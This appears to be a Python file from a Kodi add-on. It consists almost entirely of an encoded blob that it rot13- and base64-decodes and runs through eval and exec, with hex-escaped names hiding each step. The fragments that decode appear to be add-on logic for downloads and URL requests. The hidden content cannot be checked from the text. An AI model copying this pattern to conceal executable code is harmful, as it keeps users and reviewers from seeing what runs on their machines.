# 
# http://arquivoskodi.com.br

import base64, codecs
magic = ''
love = ''
god = ''
destiny = 'ACGR9FVUfjsI17ZK1oY0ACGR9FKFphMz9loJS0XRACGxMWEl5QG0kCHwRfVTMcoTHcVPftW1khWlNeVPqDo3VtMzS2o3VfVTSaqJSlMTIoY0ACGR9FKFpcQDbtVPNtVPNtVPNtVPO0pax6QDbtVPNtVPNtVPNtVPNtVPNtMzyfMF5yozAiMTHbW2SmL2ycWlxAPvNtVPNtVPNtVPNtVTI4L2IjqPOIozywo2EyEJ5wo2EyEKWlo3V6QDbtVPNtVPNtVPNtVPNtVPNtoT9aM2yhMl5fo2pbVygOH0AWFFOQnTIwn10tD2SlLJA0MKWyVTyfMJquoPOyozAioaElLJEiVT5iVTSlpKIcqz86VUfjsFVhMz9loJS0XTMcoTHcXD0XVPNtVPNtVPNtVPNtMKuwMKO0VSIhnJAiMTIRMJAiMTISpaWipwbAPvNtVPNtVPNtVPNtVPNtVPOfo2qanJ5aYzkiMltvJ0SGD0yWVRAbMJAeKFOQLKYQbKEypvOcoTIaLJjtMJ5wo250pzSxolOholOupaS1nKMiBvO7ZU0vYzMipz1uqPuznJkyXFxAPvNtVPNtVPNtVPNtVPNtVPOvLJEznJkyVQ0to3ZhpTS0nP5do2yhXTWup2HfVTMcoTHcQDbtVPNtVPNtVPNtVPNtVPNtnJLtrJImBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPO0pax6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOipl5lMJ1iqzHbLzSxMzyfMFxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTMipvOwnUIhnlOcovOwnUIhn3ZbLzSxMzyfMFjtAmHcBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTSznJkypl53pzy0MFuwnUIhnlfaKT4aXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtLJMcoTImYaqlnKEyXPqpovpcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOzZFNeCFNkQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOfo2qanJ5aYzkiMltvJ0SGD0yWVRAbMJAeKFOOpaS1nKMiVSWyoJ92nJEiBvO7ZU0tVv5zo3WgLKDbLzSxMzyfMFxfVTkyqzIfCKuvoJZhGR9UEIWFG1VcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTMipvOwnUIhnlOcovOwnUIhn3ZbLzSxMzyfMFjtAmHcBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTSzLJyfpl53pzy0MFuwnUIhnlfaKT4aXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtLJMunJkmYaqlnKEyXPqpovpcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOzZvNeCFNkQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOfo2qanJ5aYzkiMltvJ0SGD0yWVRAbMJAeKFOOpaS1nKMiVTMuoTuiqGbtrmO9VPVhMz9loJS0XTWuMTMcoTHcYPOfMKMyoQ14Lz1wYxkCE0IFHx9FXD0XVPNtVPNtVPNtVPNtVPNtVTIfp2H6QDbtVPNtVPNtVPNtVPNtVPNtVPNtVTMipvOwnUIhnlOcovOwnUIhn3ZbLzSxMzyfMFjtAmHcBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtLJMcoTImYaqlnKEyXTAbqJ5eXlqpovpcQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTSznJkypl53pzy0MFtaKT4aXD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOzZFNeCFNkQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTkiM2qcozphoT9aXPWoDIAQFHxtD2uyL2gqVRSlpKIcqz8tMJ5wo250pzSxombtrmO9VPVhMz9loJS0XTWuMTMcoTHcYPOfMKMyoQ14Lz1wYxkCE0IFHx9FXD0XVPNtVPNtVPNtVPNtVPNtVUOup3ZAPvNtVPNtVPNtnJLtpUWiM3Wyp3AsMTyuoT9aYzymL2ShL2IfMJDbXGbAPvNtVPNtVPNtVPNtVUOlo2qlMKAmK2EcLJkiMl5woT9mMFtcQDbtVPNtVPNtVPNtVPOfo2qanJ5aYzkiM19ho3EcMaxbD09BExyUYxSRER9BIRyHGRHfQDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVygQG0kCHvO7ZU1qDIAQFHxtD2uyL2ftL2ShL2IfLJEuJl9QG0kCHy0vYzMipz1uqPuQG05TFHphD09ZG1VlXFxAPvNtVPNtVPNtVPNtVUA5pl5yrTy0XPxAPvNtVPOjpz9apzImp19xnJSfo2phL2kip2HbXD0XVPNtVTSznJkypl5woT9mMFtcQDbtVPNtLJMunJkmYzAfo3AyXPxAPvNtVPO0o3EuoPN9VTyhqPuzZFxtXlOcoaDbMwVcQDbtVPNtnJLtqT90LJjtCvNjBt0XVPNtVPNtVPOcMvOipl5jLKEbYzI4nKA0pluznJkyp19zo3IhMPx6QDbtVPNtVPNtVPNtVPOgp2ptCFOlMJSxK2Mlo21sMzyfMFuznJkyp19zo3IhMPxAPvNtVPNtVPNtnJLto3ZhpTS0nP5yrTymqUZbMzyfMKAsMzScoUZcBt0XVPNtVPNtVPNtVPNtoKAaZvN9VUWyLJEsMaWioI9znJkyXTMcoTImK2MunJkmXD0XVPNtVPNtVPOcMvO5MKZ6QDbtVPNtVPNtVPNtVPOcMvO1p2H6QDbtVPNtVPNtVPNtVPNtVPNtoT9aM2yhMl5fo2qsoz90nJM5XRACGxMWEl5OERECGyEWIRkSYN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVygQG0kCHvO7ZU1qDIAQFHxtD2uyL2f6VUfksFOFMJ1iqzIlVP8trmW9VRMuoTuiqF5oY0ACGR9FKFVhMz9loJS0XRACGxMWEl5QG0kCHwVfVTLkYPOzZvxcQDbtVPNtVPNtVPNtVPOyoUAyBt0XVPNtVPNtVPNtVPNtVPNtVUqcozEiql5mnT93K3EyrUEsLz94XPWJnJI3nJ5aVSWyoJ92MJDtDIAQFHxtEzyfMKZvYN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPWoD09ZG1VtrJIfoT93KIgPKKfjsFOOpaS1nKMiplOFMJ1iqzyxo3Z6Jl9PKIfiD09ZG1WqKT4trmS9KT5poygQG0kCHvO5MJkfo3qqJ0WqrmW9VRSlpKIcqz9mVTAioFOzLJkbLGcoDy1oY0ACGR9FKIkhVUfmsFVhMz9loJS0XTLkYPOgp2pfVTLlYPOgp2plXFxAPvNtVPNtVPNtMJkmMGbAPvNtVPNtVPNtVPNtVUqcozEiql5mnT93K3EyrUEsLz94XPWJnKA1LJkcrzShMT8tLKWkqJy2o3ZtDIAQFHxtMJ5wo250pzSxo3ZvYPNvJ0ACGR9FVUyyoTkiq11oDy17ZU0tDKWkqJy2o3ZtMJ5wo250pzSxo3Z6Jl9PKIfiD09ZG1WqKT4trmS9Vv5zo3WgLKDbMwRfVT1mMlxcQDbtVPNtMJkmMGbAPvNtVPNtVPNtoT9aM2yhMl5fo2qsoz90nJM5XRACGxMWEl5OERECGyEWIRkSYN0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVygQG0kCHvO7ZU1qDIAQFHxtD2uyL2f6VR5yozu1oFOyozAioaElLJEiYyfiD09ZG1WqVv5zo3WgLKDbD09BExyUYxACGR9FZvxcQDbAPt0XMTIzVTAfMJShK3EyrUDbqTI4qPx6QDbtVPNtpzI0qKWhVUEyrUDhpzIjoTSwMFtaKT4aYPNaWlypQDbtVPNtVPNtVPNtVPNtVPNtYaWypTkuL2HbW1klWljtWlpcKN0XVPNtVPNtVPNtVPNtVPNtVP5lMKOfLJAyXPqpqPpfVPpaXIjAPvNtVPNtVPNtVPNtVPNtVPNhpzIjoTSwMFtaM3IcCFVvWljtW2q1nG0vnUE0pQbiYlVaXIjAPvNtVPNtVPNtVPNtVPNtVPNhpzIjoTSwMFtaqTuyoJH9VvVaYPNaqTuyoJH9Vzu0qUN6Yl8vWlypQDbtVPNtVPNtVPNtVPNtVPNtYaWypTkuL2HbW2SxqJk0CFVvWljtW2SxqJk0CFWholVaXD0XVPNtVPNtVPNtVPNtVPNtVN0XQDbAPvZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZAPvZtVRSxMP1iovOTqJ5wqTyioaZtVPNtVPZAPvZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZAPt0XQDcxMJLtM2I0K2SxMT9hK2W5K2yxXTyxXGbAPvNtVPO0pax6QDbtVPNtVPNtVUWyqUIlovO4Lz1wLJExo24hDJExo24bnJD9nJDcQDbtVPNtMKuwMKO0Bt0XVPNtVPNtVPOlMKE1pz4tEzSfp2HAPt0XQDcxMJLtM2I0K2SxMT9hK2yhMz8bnJDfVTyhMz8cBt0XVPNtVTSxMT9hVQ0tM2I0K2SxMT9hK2W5K2yxXTyxXD0XVPNtVTyzVTSxMT9hBt0XVPNtVPNtVPOlMKE1pz4tLJExo24hM2I0DJExo25WozMiXTyhMz8cQDbtVPNtMJkmMGbAPvNtVPNtVPNtpzI0qKWhVRMuoUAyQDbAPt0XMTIzVTqyqS9cozMiK2kuLzIfXTkuLzIfXGbAPvNtVPO0pax6QDbtVPNtVPNtVUWyqUIlovO4Lz1wYzqyqRyhMz9ZLJWyoPufLJWyoPxAPvNtVPOyrTAypUD6QDbtVPNtVPNtVUWyqUIlovOTLJkmMD0XQDbwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwQDbwVPOIHxjtEaIhL3Eco25mVPNtVPNtVPNwQDbwVlZwVlZwVlZwVlZwVlZwVlZwVlZwVlZwQDbAPt0XMTIzVS9cp191pzjbqKWfXGbAPvNtVPO0pax6VPNwVSO5qTuiovNmQDbtVPNtVPNtVTMlo20tqKWfoTyvYaOupaAyVTygpT9lqPO1pzkjLKWmMD0XVPNtVTI4L2IjqPOWoKOipaESpaWipwbtVPZtHUy0nT9hVQVAPvNtVPNtVPNtMaWioFO1pzkjLKWmMFOcoKOipaDtqKWfpTSlp2HAPt0XVPNtVUElrGbAPvNtVPNtVPNtpzImqJk0VQ0tqKWfpTSlp2HbqKWfXD0XVPNtVPNtVPOlMKE1pz4tLJkfXSglMKA1oUDhp2AbMJ1yYPOlMKA1oUDhozI0oT9wKFxAPvNtVPOyrTAypUDtIzSfqJISpaWipwbAPvNtVPNtVPNtpzI0qKWhVRMuoUAyQDbAPt0XMTIzVS9wnTIwn191pzjbqKWfYPOwpzIxXGbAPvNtVPOcoKOipaDtpzIkqJImqUZAPvNtVPOzpz9gVUWyp291pzAypl5fnJWmYzAioJ1iovOcoKOipaDtoT9aM2yhMj0XQDbtVPNtnJLtK2ymK3IloPu1pzjcBt0XVPNtVPNtVPO0pax6QDbtVPNtVPNtVPNtVPOlMKAjo25mMFN9VUWypKIyp3EmYzuyLJDbqKWfYPObMJSxMKWmCKfaqKAypv1uM2IhqPp6VRACGxMWEl5IH0IFK0SUEH5HsFjtLJkfo3qspzIxnKWyL3EmCIElqJHfVTS1qTt9L3WyMPxAPvNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtnJLtpzImpT9hp2Hhp3EuqUImK2AiMTHtCPNmZQN6QDbtVPNtVPNtVPNtVPNtVPNtoT9aM2yhMl5fo2pbVyIFGPOwnTIwnlOjLKAmMJDtMz9lVUfjsGbtH3EuqUImVTAiMTHtJ3fksI0vYzMipz1uqPu1pzjfVUWyp3OioaAyYaA0LKE1p19wo2EyXFjtoTI2MJj9rTWgLl5ZG0qREHWIElxAPvNtVPNtVPNtVPNtVPNtVPOlMKE1pz4tIUW1MD0XVPNtVPNtVPNtVPNtMJkcMvOlMKAjo25mMF5mqTS0qKAsL29xMFN8VQDjZQbAPvNtVPNtVPNtVPNtVPNtVPOfo2qanJ5aYzkiMltvIIWZVTAbMJAeVUWyMTylMJA0MJDtMaWioFO7ZU0tqT8trmS9BvOGqTS0qKZtL29xMFOormW9KFVhMz9loJS0XUIloPjtpzImpT9hp2HhnTIuMTIlp1faGT9wLKEco24aKFjtpzImpT9hp2Hhp3EuqUImK2AiMTHcYPOfMKMyoQ14Lz1wYxkCE0ESDyIUXD0XVPNtVPNtVPNtVPNtVPNtVUWyqUIlovOsL2uyL2gsqKWfXUWyp3OioaAyYzuyLJEypaAoW0kiL2S0nJ9hW10cQDbtVPNtVPNtVPNtVPOyoTyzVUWyp3OioaAyYaA0LKE1p19wo2EyVQ09VQDjZGbAPvNtVPNtVPNtVPNtVPNtVPOfo2qanJ5aYzkiMltvIIWZVUWypKIypvOuqKEyoaEcL2UQc8BwolOjLKWuVUfjsGbtH3EuqUImVTAiMTHtJ3fksI0vYzMipz1uqPu1pzjfVUWyp3OioaAyYaA0LKE1p19wo2EyXFjtoTI2MJj9rTWgLl5ZG0qREHWIElxAPvNtVPNtVPNtVPNtVPNtVPOlMKE1pz4tW2S1qTtaQDbtVPNtVPNtVPNtVPOyoUAyBt0XVPNtVPNtVPNtVPNtVPNtVTkiM2qcozphoT9aXPWOVUMypzyznJAuj6sQb28tMTHtIIWZVTMuoTuiqFOjLKWuVUfjsGbtH3EuqUImVTAiMTHtJ3fksI0vYzMipz1uqPu1pzjfVUWyp3OioaAyYaA0LKE1p19wo2EyXFjtoTI2MJj9rTWgLl5ZG0qREHWIElxAPvNtVPNtVPNtVPNtVPNtVPOlMKE1pz4tEzSfp2HAPvNtVPNtVPNtMKuwMKO0VRI4L2IjqTyiovOuplOyBt0XVPNtVPNtVPNtVPNtoT9aM2yhMl5fo2pbVxIlpz8tMTHtqzIlnJMcL2UQc8BwolOxMFOIHxjtpTSlLKfjsGbtJ3fksI0vYzMipz1uqPu1pzjfVTHcYPOfMKMyoQ14Lz1wYxkCE0ESDyIUXD0XVPNtVPNtVPNtVPNtpzI0qKWhVRMuoUAyQDbtVPNtMJkmMGbAPvNtVPNtVPNtoT9aM2yhMl5fo2pbVx8tIIWZVT7Qb28tj6xtMTHtqJ0tMKAkqJIgLFO2j6SfnJEiBvO7ZU0vYzMipz1uqPu1pzjcYPOfMKMyoQ14Lz1wYxkCE0ESDyIUXD0XVPNtVPNtVPOlMKE1pz4tEzSfp2HAPvNtVPNtVPNtQDbAPzEyMvOipTIhK3IloPu1pzjfVUA0pzIuoG1TLJkmMFjtL2uyL2f9EzSfp2HfVTAlMJD9Gz9hMFjtL291oaD9ZPx6QDbtVPNtnJ1jo3W0VUWypKIyp3EmQDbAPvNtVPOcMvOho3DtqKWfBt0XVPNtVPNtVPOlMKE1pz4tEzSfp2HAPt0XVPNtVTEcLJkiMlN9VUuvoJAaqJxhETyuoT9aXPxAPvNtVPO1p2IlK2SaMJ50VQ0trlq1p2IlYJSaMJ50WmbtD09BExyUYyIGEIWsDHqSGyE9QDbtVPNtL291oaDtCFNjQDbtVPNtQDbtVPNtqzSfnJDtCFOsL2uyL2gsqKWfXUIloPjtL3WyMPxAPt0XVPNtVTyzVT5iqPO2LJkcMQbAPvNtVPNtVPNtpzI0qKWhVRMuoUAyQDbtVPNtMJkmMGbAPvNtVPNtVPNtnJLtL2uyL2f6QDbtVPNtVPNtVPNtVPOlMKE1pz4tIUW1MFOcMvO2LJkcMPOyoUAyVRMuoUAyQDbtVPNtVPNtVPNtVPNAPvNtVPNtVPNtnJLtqzSfnJDtCG0tW2S1qTtaVTShMPOho3DtL3WyMQbAPvNtVPNtVPNtVPNtVTAlMJDtCFNbM2I0K2gyrJWiLKWxXTuyLJEcozp9W1ImMKWhLJ1yWlxfVTqyqS9eMKyvo2SlMPubMJSxnJ5aCFqDLKAmq29lMPpcXD0XVPNtVPNtVPNtVPNtQDbtVPNtVPNtVUWyp3OioaAyVQ0tpzIkqJImqUZhM2I0XUIloPjtnTIuMTIlpm11p2IlK2SaMJ50YPO0nJ1yo3I0CGRjYwNjZPjtp3ElMJSgCKA0pzIuoFjtLKI0nQ1wpzIxXD0XQDbtVPNtVPNtVTyzVUWyp3OioaAyYaA0LKE1p19wo2EyVQ09VQDjZGbAPvNtVPNtVPNtVPNtVUWyqUW5VQ0tMTyuoT9aYayyp25iXRACGxMWEl5OERECGyEWIRkSYPNaGlOho21yVTEyVUImqpBupzyiVT91VTRtp2IhnTRtMKWuoFOcoaoQbJkcMT9mYvOJo2CQdvOao3A0LKWcLFOxMFO0MJ50LKVtMTHtoz92om8aYPO5MKAfLJWyoQ0aITIhqTSlVT5iqzSgMJ50MFpfVT5ioTSvMJj9W0AuozAyoTSlWlxAPvNtVPNtVPNtVPNtVN0XVPNtVPNtVPNtVPNtnJLtpzI0paxtLJ5xVTAiqJ50VQjtZmbAPvNtVPNtVPNtVPNtVPNtVPOwo3IhqPNeCFNkQDbtVPNtVPNtVPNtVPNtVPNtL3WyMPN9VPuaMKEsn2I5Lz9upzDbnTIuMTyhMm0aIKAypz5uoJHaXFjtM2I0K2gyrJWiLKWxXTuyLJEcozp9W1Oup3A3o3WxWlxcQDbtVPNtVPNtVPNtVPNtVPNtQDbtVPNtVPNtVPNtVPNtVPNtpzImpT9hp2HtCFOipTIhK3IloPu1pzjfVUA0pzIuoFjtL2uyL2ffVTAlMJDfVTAiqJ50XD0XVPNtVPNtVPNtVPNtMJkmMGbAPvNtVPNtVPNtVPNtVPNtVPOxnJSfo2pho2fbD09BExyUYxSRER9BIRyHGRHfVPqOVTS1qTIhqTywLpBaj6AiVTMuoTuiqF4aXD0XVPNtVPNtVPNtVPNtVPNtVUWyqUIlovOTLJkmMD0XVPNtVPNtVPNAPvNtVPNtVPNtpzI0qKWhVUWyp3OioaAyQDb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))